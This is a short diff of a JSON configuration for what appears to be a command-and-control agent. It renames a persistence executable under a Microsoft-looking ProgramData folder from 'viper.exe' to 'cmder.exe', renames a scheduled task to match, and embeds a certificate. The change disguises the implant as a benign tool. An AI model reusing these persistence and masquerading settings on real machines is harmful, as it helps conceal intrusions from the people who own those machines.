@@ -2,8 +2,8 @@
   "agent": {
     "controllerAddress": "localhost:8000",
     "persistence": {
-      "path": "c:\\programdata\\microsoft\\devicesync\\viper.exe",
-      "taskName": "ViperTaskCore"
+      "path": "c:\\programdata\\microsoft\\devicesync\\cmder.exe",
+      "taskName": "cmderTaskCore"
     },
     "cert": {
       "cert": "-----BEGIN CERTIFICATE-----\nMIICljCCAX4CCQD8nsUd/PKvnDANBgkqhkiG9w0BAQsFADANMQswCQYDVQQGEwJV\nUzAeFw0yMjA2MTkwNzAyMzNaFw0yMjA3MTkwNzAyMzNaMA0xCzAJBgNVBAYTAlVT\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu7PPwM4411Xs3LSDE21q\nDT/ipAR25AmAzC/lgAl8WQK3CiF5hg++Rp2dntd/1b5NF/SNpubNmHiwAEXiPJdI\nLHeGRv1n+nXkDFxLQsi59v4y8Nh/7bhdI3+SIeMkuXLXmv+yYJgMu4zTN0ySJzAm\nrryqPQ7SZzYJsA5/S+r25P6vGD9qjtoRFOcn/qElifvjP25az8SkXODIvG1gS5we\nFtxd0qjTXNVvRJTbTTFf6pIGBwcp8YfxSLZ/75Vm5jdIHDBr2tSmR8inHIt4/BHz\naBmAZZapVrZrxuMrBqWntDYNckoImPQiI2q06CT65y5agXBBMnf9p8i9mAzbVslz\nuwIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQAdvD5iqYhK7fs2/Bn6xCEKgw49jo3/\nDDR0OILxZkJJw+O0c3kcqSx8JJ86N3HGxRz+bl0+A+nbljum+xpiLOWyBjrpdWut\nhviUsV7/Ca+J2gLorVrTTtUU21w2y1ksyO5AnunhJbCPORHqJBT0Iz5ilSTU/fym\nW4SDtRIzEvm24brV0Fd3AB91lNolpBR7MS/TeeA4eIo8LmMann/nHo3LZpVX9PW6\nDDQ/xbKIVAy8WS307vgzLxG2e4CsRnvWhthH2cJXpNK7HKglz5y8lnMW2Ta5fy7M\nCrXioLid76fq4V28ew0uloKmgW1VHEZl976hK8VmLzUC3/7aOWfdNwQa\n-----END CERTIFICATE-----\n",
